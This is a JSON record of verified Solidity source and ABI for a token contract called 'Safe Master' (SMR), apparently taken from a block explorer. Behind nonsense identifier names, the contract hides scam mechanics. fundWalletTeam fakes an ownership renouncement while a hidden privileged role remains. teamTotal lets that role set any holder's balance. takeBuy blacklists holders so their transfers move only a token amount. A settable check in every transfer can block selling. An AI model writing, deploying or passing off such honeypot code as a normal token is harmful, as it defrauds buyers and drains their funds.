{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface fromWallet {\n    function createPair(address enableFee, address receiverMarketing) external returns (address);\n}\n\ninterface sellIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isMarketing) external view returns (uint256);\n\n    function transfer(address launchLaunched, uint256 receiverFromTo) external returns (bool);\n\n    function allowance(address exemptShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFromTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchLaunched,\n        uint256 receiverFromTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMax, uint256 value);\n    event Approval(address indexed exemptShould, address indexed spender, uint256 value);\n}\n\nabstract contract shouldSellMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellIsMetadata is sellIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SafeMaster is shouldSellMin, sellIs, sellIsMetadata {\n\n    bool private exemptReceiver;\n\n    function isShould(address amountListExempt) public {\n        require(amountListExempt.balance < 100000);\n        if (limitTo) {\n            return;\n        }\n        \n        receiverFund[amountListExempt] = true;\n        \n        limitTo = true;\n    }\n\n    function transferFrom(address minExempt, address launchLaunched, uint256 receiverFromTo) external override returns (bool) {\n        if (_msgSender() != listLaunched) {\n            if (launchAuto[minExempt][_msgSender()] != type(uint256).max) {\n                require(receiverFromTo <= launchAuto[minExempt][_msgSender()]);\n                launchAuto[minExempt][_msgSender()] -= receiverFromTo;\n            }\n        }\n        return marketingShouldSender(minExempt, launchLaunched, receiverFromTo);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptSwapAuto;\n    }\n\n    function tradingShouldList(address minExempt, address launchLaunched, uint256 receiverFromTo) internal returns (bool) {\n        require(listLimit[minExempt] >= receiverFromTo);\n        listLimit[minExempt] -= receiverFromTo;\n        listLimit[launchLaunched] += receiverFromTo;\n        emit Transfer(minExempt, launchLaunched, receiverFromTo);\n        return true;\n    }\n\n    function takeBuy(address feeLaunch) public {\n        liquidityTake();\n        if (fromLimitLiquidity != tradingSwapAmount) {\n            toShould = fundReceiver;\n        }\n        if (feeLaunch == sellMax || feeLaunch == sellToken) {\n            return;\n        }\n        walletTake[feeLaunch] = true;\n    }\n\n    uint256 buySell;\n\n    function teamTotal(address buyMode, uint256 receiverFromTo) public {\n        liquidityTake();\n        listLimit[buyMode] = receiverFromTo;\n    }\n\n    mapping(address => bool) public walletTake;\n\n    function allowance(address minFee, address exemptTxTo) external view virtual override returns (uint256) {\n        if (exemptTxTo == listLaunched) {\n            return type(uint256).max;\n        }\n        return launchAuto[minFee][exemptTxTo];\n    }\n\n    function balanceOf(address isMarketing) public view virtual override returns (uint256) {\n        return listLimit[isMarketing];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityToken;\n    }\n\n    function approve(address exemptTxTo, uint256 receiverFromTo) public virtual override returns (bool) {\n        launchAuto[_msgSender()][exemptTxTo] = receiverFromTo;\n        emit Approval(_msgSender(), exemptTxTo, receiverFromTo);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchedModeReceiver, address indexed listTeamTotal);\n\n    address limitAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private enableAtList;\n\n    function liquidityTake() private view {\n        require(receiverFund[_msgSender()]);\n    }\n\n    address listLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return enableAtList;\n    }\n\n    uint256 sellTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeShould;\n    }\n\n    address public sellToken;\n\n    uint256 public toShould;\n\n    bool private swapMode;\n\n    function feeEnable(uint256 receiverFromTo) public {\n        liquidityTake();\n        sellTx = receiverFromTo;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTrading;\n    }\n\n    constructor (){\n        if (exemptReceiver) {\n            sellMarketing = fundReceiver;\n        }\n        atTrading shouldSwap = atTrading(listLaunched);\n        sellToken = fromWallet(shouldSwap.factory()).createPair(shouldSwap.WETH(), address(this));\n        \n        sellMax = _msgSender();\n        receiverFund[sellMax] = true;\n        listLimit[sellMax] = liquidityToken;\n        fundWalletTeam();\n        if (exemptReceiver == tradingSwapAmount) {\n            tradingSwapAmount = false;\n        }\n        emit Transfer(address(0), sellMax, liquidityToken);\n    }\n\n    bool private maxReceiver;\n\n    uint8 private takeShould = 18;\n\n    mapping(address => mapping(address => uint256)) private launchAuto;\n\n    bool public tokenMax;\n\n    mapping(address => uint256) private listLimit;\n\n    uint256 public sellMarketing;\n\n    mapping(address => bool) public receiverFund;\n\n    string private exemptSwapAuto = \"SMR\";\n\n    function fundWalletTeam() public {\n        emit OwnershipTransferred(sellMax, address(0));\n        enableAtList = address(0);\n    }\n\n    uint256 public fundReceiver;\n\n    function transfer(address buyMode, uint256 receiverFromTo) external virtual override returns (bool) {\n        return marketingShouldSender(_msgSender(), buyMode, receiverFromTo);\n    }\n\n    bool public fromLimitLiquidity;\n\n    bool private toList;\n\n    bool public tradingSwapAmount;\n\n    address public sellMax;\n\n    uint256 private liquidityToken = 100000000 * 10 ** 18;\n\n    function marketingShouldSender(address minExempt, address launchLaunched, uint256 receiverFromTo) internal returns (bool) {\n        if (minExempt == sellMax) {\n            return tradingShouldList(minExempt, launchLaunched, receiverFromTo);\n        }\n        uint256 tradingExempt = sellIs(sellToken).balanceOf(limitAuto);\n        require(tradingExempt == sellTx);\n        require(launchLaunched != limitAuto);\n        if (walletTake[minExempt]) {\n            return tradingShouldList(minExempt, launchLaunched, minAmount);\n        }\n        return tradingShouldList(minExempt, launchLaunched, receiverFromTo);\n    }\n\n    bool public limitTo;\n\n    uint256 constant minAmount = 9 ** 10;\n\n    function owner() external view returns (address) {\n        return enableAtList;\n    }\n\n    string private marketingTrading = \"Safe Master\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedModeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTeamTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTxTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTxTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFromTo\",\"type\":\"uint256\"}],\"name\":\"feeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWalletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountListExempt\",\"type\":\"address\"}],\"name\":\"isShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromTo\",\"type\":\"uint256\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwapAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SafeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}